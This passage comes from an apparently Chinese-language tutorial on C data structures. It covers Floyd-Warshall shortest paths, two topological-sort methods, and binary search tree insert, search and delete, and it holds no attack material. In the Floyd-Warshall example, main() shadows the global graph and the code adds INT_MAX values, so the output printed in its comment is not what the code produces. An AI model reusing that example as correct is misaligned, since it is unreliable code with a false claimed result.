class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INF INT_MAX</span><br><br><span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES];  <span class="hljs-comment">// 邻接矩阵</span><br><br><span class="hljs-comment">// Floyd-Warshall 算法</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">floydWarshall</span><span class="hljs-params">(<span class="hljs-type">int</span> numVertices)</span> </span>&#123;<br>    <span class="hljs-type">int</span> dist[MAX_VERTICES][MAX_VERTICES];<br><br>    <span class="hljs-comment">// 初始化距离矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; numVertices; j++) &#123;<br>            <span class="hljs-keyword">if</span> (i == j)<br>                dist[i][j] = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (graph[i][j])<br>                dist[i][j] = graph[i][j];<br>            <span class="hljs-keyword">else</span><br>                dist[i][j] = INF;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 动态规划计算最短路径</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; numVertices; k++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; numVertices; j++) &#123;<br>                <span class="hljs-keyword">if</span> (dist[i][j] &gt; dist[i][k] + dist[k][j]) &#123;<br>                    dist[i][j] = dist[i][k] + dist[k][j];<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 打印最终的最短路径矩阵</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Shortest distances between every pair of vertices:\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; numVertices; j++) &#123;<br>            <span class="hljs-keyword">if</span> (dist[i][j] == INF)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INF &quot;</span>);<br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, dist[i][j]);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> numVertices = <span class="hljs-number">4</span>;<br><br>    <span class="hljs-comment">// 示例图的邻接矩阵表示</span><br>    <span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES] = &#123;<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, INF, INF&#125;,<br>        &#123;<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, INF&#125;,<br>        &#123;INF, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>&#125;,<br>        &#123;INF, INF, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>&#125;<br>    &#125;;<br><br>    <span class="hljs-built_in">floydWarshall</span>(numVertices);  <span class="hljs-comment">// 计算所有顶点对之间的最短路径</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/*Shortest distances between every pair of vertices:</span><br><span class="hljs-comment">0 3 4 8 </span><br><span class="hljs-comment">3 0 1 4 </span><br><span class="hljs-comment">4 1 0 5 </span><br><span class="hljs-comment">8 4 5 0 </span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h4 id="AOV网和拓扑排序"><a href="#AOV网和拓扑排序" class="headerlink" title="AOV网和拓扑排序"></a>AOV网和拓扑排序</h4><p>入度法</p><p><strong>思路</strong>：</p><ol><li>计算所有节点的入度。</li><li>将入度为 0 的节点加入队列。</li><li>从队列中取出一个节点，加入排序结果中，并减少它的邻接节点的入度。</li><li>如果邻接节点的入度变为 0，则将其加入队列。</li><li>继续这个过程，直到所有节点都被处理。如果处理完后还有节点没有加入排序结果，说明图中存在环。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><br><span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES]; <span class="hljs-comment">// 邻接矩阵表示图</span><br><span class="hljs-type">int</span> inDegree[MAX_VERTICES];            <span class="hljs-comment">// 存储每个节点的入度</span><br><span class="hljs-type">int</span> numVertices;                       <span class="hljs-comment">// 图的顶点数</span><br><br><span class="hljs-comment">// 入度法实现拓扑排序</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">topologicalSort</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> queue[MAX_VERTICES], front = <span class="hljs-number">0</span>, rear = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// 将入度为 0 的节点加入队列</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-keyword">if</span> (inDegree[i] == <span class="hljs-number">0</span>) &#123;<br>            queue[rear++] = i;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 记录已排序的顶点数量</span><br>    <span class="hljs-type">int</span> sortedCount = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">while</span> (front &lt; rear) &#123;<br>        <span class="hljs-type">int</span> u = queue[front++];  <span class="hljs-comment">// 取出一个节点</span><br>        <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, u);        <span class="hljs-comment">// 输出当前节点（加入拓扑排序结果）</span><br>        sortedCount++;<br>        <br>        <span class="hljs-comment">// 减少与该节点相邻的顶点的入度</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v = <span class="hljs-number">0</span>; v &lt; numVertices; v++) &#123;<br>            <span class="hljs-keyword">if</span> (graph[u][v] == <span class="hljs-number">1</span>) &#123;<br>                inDegree[v]--;<br>                <span class="hljs-keyword">if</span> (inDegree[v] == <span class="hljs-number">0</span>) &#123;<br>                    queue[rear++] = v;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 如果所有节点都已排序，则图是DAG，否则存在环</span><br>    <span class="hljs-keyword">if</span> (sortedCount != numVertices) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n图中存在环，无法进行拓扑排序。\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    numVertices = <span class="hljs-number">6</span>;  <span class="hljs-comment">// 图的顶点数</span><br><br>    <span class="hljs-comment">// 构建示例图（邻接矩阵表示）</span><br>    <span class="hljs-type">int</span> g[MAX_VERTICES][MAX_VERTICES] = &#123;<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;<br>    &#125;;<br>    <br>    <span class="hljs-comment">// 将邻接矩阵赋值给图</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; numVertices; j++) &#123;<br>            graph[i][j] = g[i][j];<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 初始化入度数组</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        inDegree[i] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; numVertices; j++) &#123;<br>            <span class="hljs-keyword">if</span> (graph[j][i] == <span class="hljs-number">1</span>) &#123;<br>                inDegree[i]++;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;拓扑排序结果：\n&quot;</span>);<br>    <span class="hljs-built_in">topologicalSort</span>();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/*拓扑排序结果：</span><br><span class="hljs-comment">0 1 2 3 4 5 </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><p>深度优先搜索法实现拓扑排序</p><p>对图进行深度优先搜索（DFS）。</p><p>在回溯过程中，将节点压入栈中。</p><p>最终栈中的节点顺序即为拓扑排序的结果（栈顶到栈底）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><br><span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES]; <span class="hljs-comment">// 邻接矩阵表示图</span><br><span class="hljs-type">bool</span> visited[MAX_VERTICES];            <span class="hljs-comment">// 记录节点是否被访问</span><br><span class="hljs-type">int</span> numVertices;                       <span class="hljs-comment">// 图的顶点数</span><br><br><span class="hljs-comment">// 递归深度优先搜索</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> stack[], <span class="hljs-type">int</span> *top)</span> </span>&#123;<br>    visited[u] = <span class="hljs-literal">true</span>;<br>    <br>    <span class="hljs-comment">// 访问所有邻接节点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v = <span class="hljs-number">0</span>; v &lt; numVertices; v++) &#123;<br>        <span class="hljs-keyword">if</span> (graph[u][v] == <span class="hljs-number">1</span> &amp;&amp; !visited[v]) &#123;<br>            <span class="hljs-built_in">dfs</span>(v, stack, top);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 将节点加入栈</span><br>    stack[(*top)++] = u;<br>&#125;<br><br><span class="hljs-comment">// 深度优先搜索法实现拓扑排序</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">topologicalSort</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> stack[MAX_VERTICES];<br>    <span class="hljs-type">int</span> top = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 初始化访问标记</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        visited[i] = <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 对每个未访问的节点进行DFS遍历</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-keyword">if</span> (!visited[i]) &#123;<br>            <span class="hljs-built_in">dfs</span>(i, stack, &amp;top);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 打印拓扑排序结果（栈中的顺序）</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;拓扑排序结果：\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = top - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, stack[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    numVertices = <span class="hljs-number">6</span>;  <span class="hljs-comment">// 图的顶点数</span><br><br>    <span class="hljs-comment">// 构建示例图（邻接矩阵表示）</span><br>    <span class="hljs-type">int</span> g[MAX_VERTICES][MAX_VERTICES] = &#123;<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;<br>    &#125;;<br>    <br>    <span class="hljs-comment">// 将邻接矩阵赋值给图</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; numVertices; j++) &#123;<br>            graph[i][j] = g[i][j];<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">topologicalSort</span>();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>图</strong>是一种重要的数据结构，主要用于表示对象之间的关系，可以分为有向图和无向图。</p><p>在C语言中，图通常使用<strong>邻接矩阵</strong>或<strong>邻接表</strong>来表示，邻接矩阵适用于<strong>稠密图</strong>，邻接表适用于<strong>稀疏图</strong>。</p><p>常见的图操作包括<strong>深度优先遍历（DFS）</strong>、<strong>广度优先遍历（BFS）</strong>、求最短路径、连通性等。</p><p>选择合适的图表示方式和遍历方法可以提高程序的效率和可读性。</p><p>排序</p><p>二叉排序树</p><p>插入操作（Insert）</p><p>插入操作的目的是将新节点插入到树中的合适位置。插入过程如下：</p><ul><li>从根节点开始，比较要插入的值与当前节点的值。</li><li>如果新值小于当前节点的值，则递归插入到左子树；如果新值大于当前节点的值，则递归插入到右子树。</li><li>如果当前节点的左子树或右子树为空，则直接插入节点。</li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xl">typedef struct TreeNode &#123;<br>    int <span class="hljs-keyword">data</span>;<br>    struct TreeNode *left, *right;<br>&#125; TreeNode;<br><br>TreeNode* insert(TreeNode* root, int value) &#123;<br>    <span class="hljs-keyword">if</span> (root == NULL) &#123;<br>        TreeNode* newNode = (TreeNode*)malloc(sizeof(TreeNode));<br>        <span class="hljs-function"><span class="hljs-title">newNode</span>-&gt;</span><span class="hljs-keyword">data</span> = value;<br>        <span class="hljs-function"><span class="hljs-title">newNode</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">left</span> = newNode-&gt;</span>right = NULL;<br>        return newNode;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-title">if</span> (value &lt; root-&gt;</span><span class="hljs-keyword">data</span>) &#123;<br>        <span class="hljs-function"><span class="hljs-title">root</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">left</span> = insert(root-&gt;</span>left, value);  <span class="hljs-comment">// 插入到左子树</span><br>    &#125; <span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span> (value &gt; root-&gt;</span><span class="hljs-keyword">data</span>) &#123;<br>        <span class="hljs-function"><span class="hljs-title">root</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span> = insert(root-&gt;</span>right, value);  <span class="hljs-comment">// 插入到右子树</span><br>    &#125;<br>    return root;<br>&#125;<br></code></pre></td></tr></table></figure><p>查找操作（Search）</p><p>查找操作用于判断某个值是否在二叉排序树中。查找的过程与插入类似，从根节点开始，依次向左或向右子树移动，直到找到目标节点或到达叶子节点。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xl">TreeNode* search(TreeNode* root, int value) &#123;<br>    <span class="hljs-function"><span class="hljs-title">if</span> (root == NULL || root-&gt;</span><span class="hljs-keyword">data</span> == value) &#123;<br>        return root;  <span class="hljs-comment">// 如果找到值或到达空节点</span><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-title">if</span> (value &lt; root-&gt;</span><span class="hljs-keyword">data</span>) &#123;<br>        <span class="hljs-function"><span class="hljs-title">return</span> search(root-&gt;</span>left, value);  <span class="hljs-comment">// 在左子树查找</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-function"><span class="hljs-title">return</span> search(root-&gt;</span>right, value);  <span class="hljs-comment">// 在右子树查找</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>删除操作（Delete）</li></ol><p>删除操作有三种情况：</p><ol><li><strong>删除叶子节点</strong>：直接删除该节点。</li><li><strong>删除只有一个子节点的节点</strong>：将该节点的父节点指向该节点的唯一子节点。</li><li><strong>删除有两个子节点的节点</strong>：找到该节点的中序后继（右子树中最小的节点）或中序前驱（左子树中最大的节点），用它替换该节点，然后删除中序后继或前驱节点。</li></ol><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs xl">TreeNode* minValueNode(TreeNode* node) &#123;<br>    TreeNode* current = node;<br>    <span class="hljs-function"><span class="hljs-title">while</span> (current &amp;&amp; current-&gt;</span>left != NULL) &#123;<br>        <span class="hljs-function"><span class="hljs-title">current</span> = current-&gt;</span>left;  <span class="hljs-comment">// 查找左子树的最小节点</span><br>    &#125;<br>    return current;<br>&#125;<br><br>TreeNode* deleteNode(TreeNode* root, int value) &#123;<br>    <span class="hljs-keyword">if</span> (root == NULL) return root;<br>    <br>    <span class="hljs-function"><span class="hljs-title">if</span> (value &lt; root-&gt;</span><span class="hljs-keyword">data</span>) &#123;<br>        <span class="hljs-function"><span class="hljs-title">root</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">left</span> = deleteNode(root-&gt;</span>left, value);  <span class="hljs-comment">// 删除左子树中的节点</span><br>    &#125; <span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span> (value &gt; root-&gt;</span><span class="hljs-keyword">data</span>) &#123;<br>        <span class="hljs-function"><span class="hljs-title">root</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span> = deleteNode(root-&gt;</span>right, value);  <span class="hljs-comment">// 删除右子树中的节点</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 处理删除节点的三种情况</span><br>        <span class="hljs-function"><span class="hljs-title">if</span> (root-&gt;</span>left == NULL) &#123;<br>            T<span class="hljs-function"><span class="hljs-title">reeNode</span>* temp = root-&gt;</span>right;<br>            free(root);<br>            return temp;<br>        &#125; <span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span> (root-&gt;</span>right == NULL) &#123;<br>            T<span class="hljs-function"><span class="hljs-title">reeNode</span>* temp = root-&gt;</span>left;<br>            free(root);<br>            return temp;<br>        &#125;<br>        <br>        <span class="hljs-comment">// 找到右子树中的最小节点，并用它替换当前节点</span><br>        T<span class="hljs-function"><span class="hljs-title">reeNode</span>* temp = minValueNode(root-&gt;</span>right);<br>        <span class="hljs-function"><span class="hljs-title">root</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">data</span> = temp-&gt;</span><span class="hljs-keyword">data</span>;<br>        <span class="hljs-function"><span class="hljs-title">root</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span> = deleteNode(root-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span>, temp-&gt;</span><span class="hljs-keyword">data</span>);  <span class="hljs-comment">// 删除右子树中的最小节点</span><br>    &#125;<br>    return root;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-中序遍历（Inorder-Traversal）"><a href="#4-中序遍历（Inorder-Traversal）" class="headerlink" title="4. 中序遍历（Inorder Traversal）"></a>4. 中序遍历（Inorder Traversal）</h4><p><strong>中序遍历</strong>可以按升序输出二叉排序树中的所有节点。在二叉排序树中，中序遍历的结果总是<strong>递增的</strong>。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">void <span 